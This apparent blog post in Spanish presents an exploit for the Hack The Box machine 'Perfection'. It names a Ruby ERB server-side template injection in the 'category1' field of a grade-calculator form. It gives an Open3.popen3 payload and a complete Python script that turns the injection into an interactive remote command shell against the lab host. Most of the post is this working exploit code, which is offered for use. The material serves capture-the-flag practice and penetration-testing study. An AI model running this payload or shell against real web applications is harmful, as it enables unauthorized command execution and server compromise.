---

title: PerfectionHTB 
date: 2024-04-14 09:37 +0800
categories: [Scripts]
tags: [Scripts, HTB]
pin: true
image:
  path: /assets/img/commons/PerfectionHTB/bannerPerfectionHTB.png
  width: 66
  height: 40
  alt: Perfection
---

Script para explotar un SSTI gracias a la libreria `webrick 1.7.0` de HTML escrita en `Ruby`. 
1. La variable `categori1` en la ruta `/weighted-grade` es vulnerable a SSTI.
2. Payload -> `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>`

- Referencias:
	- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
	- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

<figure style="text-align: center;">
  <img src="/assets/img/commons/PerfectionHTB/PerfectionHTB.png" alt="HTB">
  <figcaption style="font-style: italic; font-size: smaller;"></figcaption>
</figure>

-----------------------------------------------------------------------------------------------

```python
#!/usr/bin/env python3

import requests
import signal
from termcolor import colored
from bs4 import BeautifulSoup

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def ssti():
    while True:
        command = input(colored(f"\n[+] Command -> ", 'blue'))
        url = 'http://10.10.11.253/weighted-grade-calc'
        headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Referer': 'http://10.10.11.253/weighted-grade',
}
        data = {
    'category1': 'test\n<%=require \'open3\' %><% @a,@b,@c,@d=Open3.popen3(\'isCommand\') %><%= @b.readline()%>'.replace('isCommand', command),
    'grade1': '1',
    'weight1': '100',
    'category2': 'N/A',
    'grade2': '1',
    'weight2': '0',
    'category3': 'N/A',
    'grade3': '1',
    'weight3': '0',
    'category4': 'N/A',
    'grade4': '1',
    'weight4': '0',
    'category5': 'N/A',
    'grade5': '1',
    'weight5': '0'
}
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            paragraphs = soup.find_all('p')
            result = None
            for p in paragraphs:
                text = p.text.strip()
                if 'test' in text and '1%' in text:
                    result = text.replace('test', '').replace(': 1%', '').strip()
                    break
            if result:
                print(colored(f"\t$> ", 'blue') + result)
            else:
                print("[!] Command ERROR")
        else:
            print("Status code:", response.status_code)
def main():
    print(colored(f"\n[+] Ejecución de comandos mediante SSTI en la máquina Perfection de HTB", 'green'))
    ssti()
if __name__ == '__main__':
    main()
```
